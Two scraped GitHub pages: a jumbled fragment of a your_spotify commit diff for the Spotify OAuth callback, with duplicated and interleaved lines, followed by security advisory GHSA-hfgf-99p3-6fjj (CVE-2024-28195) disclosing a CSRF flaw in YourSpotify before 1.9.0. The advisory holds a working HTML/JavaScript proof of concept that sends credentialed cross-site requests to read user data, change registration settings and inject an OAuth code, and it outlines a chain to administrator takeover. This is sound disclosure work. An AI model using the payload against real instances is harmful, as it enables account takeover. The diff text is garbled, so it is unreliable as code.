|  |  | const cookie = spotifyCallbackOAuthCookie.parse( |
|  |  | req.cookies[OAUTH\_COOKIE\_NAME], |
|  |  | ); |
|  |  |  |
|  |  | if (state !== cookie.state) { |
|  |  | throw new Error("State does not match"); |
|  |  | } |
|  |  | const nbUsers = await getUserCount(); |
|  |  | user = await createUser( |
|  |  | spotifyMe.display\_name, |
|  |  | spotifyMe.id, |
|  |  | nbUsers === 0, |
|  |  |  |
|  |  | const infos = await Spotify.exchangeCode(code, cookie.state); |
|  |  |  |
|  |  | const client = Spotify.getHttpClient(infos.accessToken); |
|  |  | const { data: spotifyMe } = await client.get("/me"); |
|  |  | let user = await getUserFromField("spotifyId", spotifyMe.id, false); |
|  |  | if (!user) { |
|  |  | if (!globalPreferences.allowRegistrations) { |
|  |  | return res.redirect( |
|  |  | `${get("CLIENT\_ENDPOINT")}/registrations-disabled`, |
|  |  | ); |
|  |  | } |
|  |  | const nbUsers = await getUserCount(); |
|  |  | user = await createUser( |
|  |  | spotifyMe.display\_name, |
|  |  | spotifyMe.id, |
|  |  | nbUsers === 0, |
|  |  | ); |
|  |  | } |
|  |  | await storeInUser("\_id", user.\_id, infos); |
|  |  | const privateData = await getPrivateData(); |
|  |  | if (!privateData?.jwtPrivateKey) { |
|  |  | throw new Error("No private data found, cannot sign JWT"); |
|  |  | } |
|  |  | const token = sign( |
|  |  | { userId: user.\_id.toString() }, |
|  |  | privateData.jwtPrivateKey, |
|  |  | { |
|  |  | expiresIn: getWithDefault("COOKIE\_VALIDITY\_MS", "1h"), |
|  |  | }, |
|  |  | ); |
|  |  | storeTokenInCookie(req, res, token); |
|  |  | } catch (e) { |
|  |  | logger.error(e); |
|  |  | } finally { |
|  |  | res.clearCookie(OAUTH\_COOKIE\_NAME); |
|  |  | } |
|  |  | await storeInUser("\_id", user.\_id, infos); |
|  |  | const privateData = await getPrivateData(); |
|  |  | if (!privateData?.jwtPrivateKey) { |
|  |  | throw new Error("No private data found, cannot sign JWT"); |
|  |  | } |
|  |  | const token = sign( |
|  |  | { userId: user.\_id.toString() }, |
|  |  | privateData.jwtPrivateKey, |
|  |  | { |
|  |  | expiresIn: getWithDefault("COOKIE\_VALIDITY\_MS", "1h"), |
|  |  | }, |
|  |  | ); |
|  |  | res.cookie("token", token); |
|  |  | } catch (e) { |
|  |  | logger.error(e); |
|  |  | } |
|  |  | return res.redirect(get("CLIENT\_ENDPOINT")); |
|  |  | }); |
|  |  | return res.redirect(get("CLIENT\_ENDPOINT")); |
|  |  | }, |
|  |  | ); |
|  |  |  |
|  |  | router.get("/spotify/me", logged, withHttpClient, async (req, res) => { |
|  |  | const { client } = req as SpotifyRequest; |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `c3ae876`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FYooooomi%2Fyour_spotify%2Fcommit%2Fc3ae87673910c9903bb53088c8b71ed2c9aa54e4) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_0f57806c_20250111_165343.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FYooooomi%2Fyour_spotify%2Fsecurity%2Fadvisories%2FGHSA-hfgf-99p3-6fjj)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FYooooomi%2Fyour_spotify%2Fsecurity%2Fadvisories%2FGHSA-hfgf-99p3-6fjj)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=Yooooomi%2Fyour_spotify)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Yooooomi](/Yooooomi)
/
**[your\_spotify](/Yooooomi/your_spotify)**
Public

* [Notifications](/login?return_to=%2FYooooomi%2Fyour_spotify) You must be signed in to change notification settings
* [Fork
  140](/login?return_to=%2FYooooomi%2Fyour_spotify)
* [Star
   3.3k](/login?return_to=%2FYooooomi%2Fyour_spotify)

* [Code](/Yooooomi/your_spotify)
* [Issues
  97](/Yooooomi/your_spotify/issues)
* [Pull requests
  7](/Yooooomi/your_spotify/pulls)
* [Discussions](/Yooooomi/your_spotify/discussions)
* [Actions](/Yooooomi/your_spotify/actions)
* [Projects
  0](/Yooooomi/your_spotify/projects)
* [Security](/Yooooomi/your_spotify/security)
* [Insights](/Yooooomi/your_spotify/pulse)

Additional navigation options

* [Code](/Yooooomi/your_spotify)
* [Issues](/Yooooomi/your_spotify/issues)
* [Pull requests](/Yooooomi/your_spotify/pulls)
* [Discussions](/Yooooomi/your_spotify/discussions)
* [Actions](/Yooooomi/your_spotify/actions)
* [Projects](/Yooooomi/your_spotify/projects)
* [Security](/Yooooomi/your_spotify/security)
* [Insights](/Yooooomi/your_spotify/pulse)

# Cross-Site Request Forgery (CSRF) vulnerability in API and login

High

[Yooooomi](/Yooooomi)
published
GHSA-hfgf-99p3-6fjj
Mar 13, 2024

## Package

No package listed

## Affected versions

<1.9.0

## Patched versions

1.9.0

## Description

### Summary

YourSpotify version <1.9.0 does not protect its API and login flow against Cross-Site Request Forgery (CSRF).

Attackers can use this to execute CSRF attacks on victims, allowing them to retrieve, modify or delete data on the affected YourSpotify instance.

Using repeated CSRF attacks, it is also possible to create a new user on the victim instance and promote the new user to instance administrator if a legitimate administrator visits a website prepared by an attacker.

Note: Real-world exploitability of this vulnerability depends on the browser version and browser settings in use by the victim.

### Details

There are multiple underlying issues that contribute to this security issue. These issues will be laid out in the following sections.

#### Overly permissive default CORS policy

The default setup guide in the repository does not emphasize that a proper CORS policy is required for security. If no specific CORS policy is set, YourSpotify allows any origin by default.

It is safe to assume that many users will not configure a custom and secure CORS policy, as the overly permissive default 'works' in the sense that YourSpotify will work as expected.

As `Access-Control-Allow-Credentials` is also set to `true` in the CORS policy, this effectively allows any third-party (i.e. cross-origin and cross-site) to interact with the YourSpotify API using the session cookie saved in the browser

#### Missing `SameSite` cookie attribute

YourSpotify does not set any cookie security flags for its session cookie named `token`. Specifically, the `SameSite` cookie flag, which can provide protection against CSRF, is not set.

Some browsers (such as Google Chrome) actually default to `SameSite: lax`-like behavior when it is not explictly set, while other browser (such as Firefox) do not do this (as of now). The required attribute should be explicitly set.

#### No CSRF token or anti-CSRF header is in use

YourSpotify also does not employ any other CSRF countermeasures, such as CSRF tokens or anti-CSRF headers. See the remediation recommendations for more information.

#### Missing OAuth 2.0 `state` validation and missing OAuth 2.0 PKCE implementation

The OAuth 2.0 based login flow is a special case for CSRF, as it is the only backend functionality that is intended to be used by directly accessing the endpoint using a browser.

The OAuth 2.0 standard requires CSRF protection (see [RFC 6749 section 10.12](https://datatracker.ietf.org/doc/html/rfc6749#section-10.12) as well as [the current draft of "OAuth 2.0 Security Best Current Practice" section 4.7](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics#section-4.7)) to be secure. This can be achieved by generating a random `state` variable, binding it to the user session, adding it to the authorization request, and finally validating the given `state` against the saved session value when the authorization code is delivered to the callback URL.

Additionally, PKCE (Proof Key for Code Exchange, see [RFC6736](https://datatracker.ietf.org/doc/html/rfc7636)) also provides protection against CSRF attacks.

Both the `state` variable and PKCE are not used by YourSpotify, allowing an attacker to inject their own authorization code using CSRF. This can allow an attacker to register a new user account on a YourSpotify instance using CSRF.

#### Browser version and settings disclaimer

Real-world exploitability of this vulnerability depends on the browser version and browser settings in use by the victim. As an example, `SameSite` cookie flag default values differ from browser to browser. Additionally, initiatives and features such as [Third-party cookie deprecation in Chrome](https://developers.google.com/privacy-sandbox/3pcd) or [Firefox "Total Cookie Protection"](https://blog.mozilla.org/en/mozilla/firefox-rolls-out-total-cookie-protection-by-default-to-all-users-worldwide/) may cause the browser not to send cross-site cookies, even thought both the cookie flags and the CORS policy would allow it.

However, the underlying issues should be fixed regardless so that all users are protected from this vulnerability.

### Proof of Concept

Because of time constraints, this section only provides a simple proof of concept for reading and altering YourSpotify data. A more interesting attack scenario is also presented, but not implemented as a proof of concept.

#### Simple proof of concept

The following HTML and JS files can be hosted on an attacker server for a proof of concept:

`csrf.html`:

```
<!DOCTYPE html>
<html>
    <head>
        <title>CSRF Test</title>
        <script src="/csrf.js"></script>
    </head>

    <body>
        <h1>CSRF Test</h1>
        Interacting with <span id="victimServer"></span>
        <p>
        <button id="allowSignupButton">Allow Signup</button>
        <button id="disallowSignupButton">Disallow Signup</button>
        <br>
        <button id="logoutButton">Log out</button>
        <br>
        <input id="loginAuthCode" placeholder="Authorization Code"></input>
        <button id="loginButton">Login with auth code</button>
        <p>
        Global Preferences Output:
        <pre id="csrf-output-prefs"></pre>
        <p>
        /me Output:
        <pre id="csrf-output-me"></pre>
    </body>
</html>
```

`csrf.js`:

```
const victimServer = "http://backend.yourspotify.internal:8080";

const fetchMe = async () => {
    const responseUserRedactions = {
        username: "<REDACTED>",
        spotifyId: "<REDACTED>",
        accessToken: "<REDACTED>",
        refreshToken: "<REDACTED>",
    }

    let response = await fetch(`${victimServer}/me`, { credentials: "include"})
        .then(r => r.json());

    if (response.user !== undefined) {
        response.user = {...response.user, ...responseUserRedactions};
    }
    return response
};

const fetchGlobalPrefs = async () => {
    response = await fetch(`${victimServer}/global/preferences`, { credentials: "include"})
        .then(r => r.json());

    return response;
};

const refreshOutput = async(fetchFn, targetElement) => {
    let response = await fetchFn();
    let formattedResponse = JSON.stringify(response, null, 2);

    document.querySelector(targetElement).textContent = formattedResponse;
};

const allowSignup = async (allowSignupState) => {
    response = await fetch(`${victimServer}/global/preferences`, {
         credentials: "include",
         method: "POST",
         body: JSON.stringify({ "allowRegistrations": allowSignupState }),
         headers: {
            "Content-Type": "application/json",
         }
    }).then(r => r.json());

    await refreshOutput(fetchGlobalPrefs, "#csrf-output-prefs");
    return response;
};

const logout = async () => {
    response = await fetch(`${victimServer}/logout`, {
         credentials: "include",
         method: "POST",
    });

    await refreshOutput(fetchMe, "#csrf-output-me");
};

const login = async () => {
    let authCode = document.getElementById("loginAuthCode").value;
    let params = new URLSearchParams({
        code: authCode
    });
    try {
        response = await fetch(`${victimServer}/oauth/spotify/callback?${params}`, {
            credentials: "include",
            method: "GET",
        });
    } catch (err) {
        // This fails because the backend redirects to the frontend and the frontend
        // doesn't allow CORS with credentials. This can be ignored.
        console.log(err);
    }
    await refreshOutput(fetchMe, "#csrf-output-me");
};

const bindListeners = () => {
    document.getElementById("allowSignupButton").onclick = e => allowSignup(true);
    document.getElementById("disallowSignupButton").onclick = e => allowSignup(false);
    document.getElementById("logoutButton").onclick = e => logout();
    document.getElementById("loginButton").onclick = e => login();
};

window.onload = async () => {
    bindListeners();
    document.getElementById("victimServer").innerText = victimServer;
    await refreshOutput(fetchMe, "#csrf-output-me");
    await refreshOutput(fetchGlobalPrefs, "#csrf-output-prefs");
};
```

When a victim user opens this site in Firefox (with Firefox enhanced tracking protection disabled or configured to a low level), the following content is shown:

[![YourSpotify CSRF](https://private-user-images.githubusercontent.com/1112236/311463919-cc572024-e1ba-43eb-ac79-5a7caf64b532.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTQ3MjMsIm5iZiI6MTczNjYxNDQyMywicGF0aCI6Ii8xMTEyMjM2LzMxMTQ2MzkxOS1jYzU3MjAyNC1lMWJhLTQzZWItYWM3OS01YTdjYWY2NGI1MzIucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMTY1MzQzWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9OWJlOTQ2MGZkNDQxMWYzOThiMmZmYjY4MjYzODYzZjcyOGVhZGFhNmE5MWY0ZjU5YTQ4MWMzYTViNWNiMWMyNSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.0ygf2WqKeiUYG3Qv0xlLV14rsiXmMAXgbRc6c33foqA)](https://private-user-images.githubusercontent.com/1112236/311463919-cc572024-e1ba-43eb-ac79-5a7caf64b532.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTQ3MjMsIm5iZiI6MTczNjYxNDQyMywicGF0aCI6Ii8xMTEyMjM2LzMxMTQ2MzkxOS1jYzU3MjAyNC1lMWJhLTQzZWItYWM3OS01YTdjYWY2NGI1MzIucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMTY1MzQzWiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9OWJlOTQ2MGZkNDQxMWYzOThiMmZmYjY4MjYzODYzZjcyOGVhZGFhNmE5MWY0ZjU5YTQ4MWMzYTViNWNiMWMyNSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.0ygf2WqKeiUYG3Qv0xlLV14rsiXmMAXgbRc6c33foqA)

As shown in the screenshot, the account data can be read from a cross-site origin.

The "Allow Signup" and "Disallow Signup" buttons can be used to update the server preferences to allow new users to sign up. Finally, the logout and login buttons can be used to log out the existing session or log in a new session with a supplied OAuth authorization code.

Reading this data and performing these actions should only be allowed and possible from the frontend origin.

#### Description of more elaborate proof of concept

An interesting real-world attack would perform the following actions in an automated fashion:

1. Enable new user sign-up using CSRF (requires an admin user to be currently logged into YourSpotify)
2. Create a new user controlled by the attacker on the YourSpotify instance, either by CSRF-ing the OAuth 2.0 callback or by completing the sign-up flow from the attacker server (if the target YourSpotify instance is reachable by the attacker)
3. Use CSRF again to make the victim administrator promote the attacker user to administrator

After this, the attacker has gained access to the target YourSpotify instance as an administrator.

### Impact

Attackers can use this to execute CSRF attacks on victims, allowing them to retrieve, modify or delete data on the affected YourSpotify instance.

Using repeated CSRF attacks, it is also possible to create a new user on the victim instance and promote the new user to instance administrator if a legitimate administrator visits a website prepared by an attacker.

Note: Real-world exploitability of this vulnerability depends on the browser version and browser settings in use by the victim.

### Severity

High

8.1

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
Required

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
None

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N

### CVE ID

CVE-2024-28195

### Weaknesses

[CWE-352](/advisories?query=cwe%3A352) [CWE-1275](/advisories?query=cwe%3A1275)

### Credits

* [![@RagingCactus](https://avatars.githubusercontent.com/u/1112236?s=40&v=4)](/RagingCactus)
  [RagingCactus](/RagingCactus)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


